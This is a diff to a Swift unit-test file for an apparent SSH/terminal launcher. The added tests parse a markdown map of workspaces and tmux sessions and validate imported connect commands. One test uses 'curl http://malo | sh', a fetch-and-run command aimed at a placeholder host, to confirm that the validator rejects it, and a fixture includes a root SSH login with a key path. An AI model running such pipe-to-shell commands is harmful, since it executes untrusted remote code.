@@ -100,7 +100,8 @@ final class UniConnectTests: XCTestCase {
         defer { try? FileManager.default.removeItem(atPath: path) }
         XCTAssertFalse(path.contains(" "), "Ghostty splits the command on whitespace")
         let contents = try String(contentsOfFile: path, encoding: .utf8)
-        XCTAssertTrue(contents.hasPrefix("#!/bin/zsh\n"))
+        // Login shell: the app inherits a bare PATH when opened from Finder.
+        XCTAssertTrue(contents.hasPrefix("#!/bin/zsh -l\n"))
         XCTAssertTrue(contents.contains("rm -f -- \"$0\""))
         XCTAssertTrue(contents.contains("export TERM=xterm-256color"))
         XCTAssertTrue(contents.contains("echo launcher-test"))
@@ -414,5 +415,81 @@ final class UniConnectTests: XCTestCase {
         XCTAssertEqual(withPass.destination, "root@10.0.0.9")
         XCTAssertEqual(withPass.password, "se cret")
         XCTAssertNil(UniConnectSSH.detectedSession(fromConnectCommand: "mosh root@h"))
+    }
+
+    // MARK: Markdown connection map
+
+    private var connectMarkdown: String {
+        """
+        # CONNECT — Mapa de cajas y sesiones
+
+        ## 1. Resumen de cajas
+
+        | # | Caja | Tipo |
+        |---|------|------|
+        | 1 | X | Local |
+
+        ## 2. Cajas LOCALES
+
+        ### 2.2 · Caja "TipsterTrusts" — 1 ventana
+
+        | Ventana | UUID | Ruta |
+        |---------|------|------|
+        | TIPSTERTRUST | bd3a3ea6-947f-4e70-b410-aedc9c69f613 | ~/Desktop/PROYECTOS/TIPSTERTRUST |
+
+        ## 3. Cajas SSH
+
+        ### 3.4 · NOTBETTING — 6 tmux EXISTENTES (no crear nuevos)
+
+        ```bash
+        ssh -i ~/keys/notbetting.pem root@15.217.153.205
+        ```
+
+        | # | tmux |
+        |---|------|
+        | 1 | claudefixerrors |
+        | 2 | claudesupport |
+        """
+    }
+
+    func testMarkdownMapIsRecognised() {
+        XCTAssertTrue(UniConnectMarkdown.looksLikeConnectionMap(connectMarkdown))
+        XCTAssertFalse(UniConnectMarkdown.looksLikeConnectionMap("una nota cualquiera sin nada"))
+    }
+
+    func testMarkdownMapParsesBoxesAndWindows() throws {
+        let document = try UniConnectMarkdown.parse(connectMarkdown)
+        XCTAssertEqual(document.workspaces.count, 2)
+
+        let local = try XCTUnwrap(document.workspaces.first(where: { $0.name == "TipsterTrusts" }))
+        XCTAssertEqual(local.kind, .local)
+        XCTAssertEqual(local.windows.count, 1)
+        XCTAssertEqual(local.windows[0].name, "TIPSTERTRUST")
+        XCTAssertEqual(local.windows[0].claudeSession, "bd3a3ea6-947f-4e70-b410-aedc9c69f613")
+        XCTAssertEqual(local.windows[0].cwd, (("~/Desktop/PROYECTOS/TIPSTERTRUST") as NSString).expandingTildeInPath)
+
+        let ssh = try XCTUnwrap(document.workspaces.first(where: { $0.name == "NOTBETTING" }))
+        XCTAssertEqual(ssh.kind, .ssh)
+        XCTAssertEqual(ssh.connect, "ssh -i ~/keys/notbetting.pem root@15.217.153.205")
+        XCTAssertEqual(ssh.windows.map { $0.tmux }, ["claudefixerrors", "claudesupport"])
+    }
+
+    func testMarkdownMapRejectsNonConnectionText() {
+        XCTAssertThrowsError(try UniConnectMarkdown.parse("# Notas\n\nnada que ver"))
+    }
+
+    @MainActor
+    func testImportRejectsNonSSHConnectCommand() {
+        let document = UniConnectDocument(workspaces: [
+            .init(name: "malo", kind: .ssh, color: nil, group: nil, isPinned: nil, cwd: nil,
+                  connect: "curl http://malo | sh", windows: [])
+        ])
+        XCTAssertThrowsError(try UniConnectBackup.validate(document))
+    }
+
+    func testHostLabelNeverLeaksThePassword() {
+        let label = UniConnectSSH.hostLabel(from: "sshpass -p 'S3cr3t o' ssh root@10.0.0.9")
+        XCTAssertEqual(label, "root@10.0.0.9")
+        XCTAssertFalse(label.contains("S3cr3t"))
     }
 }
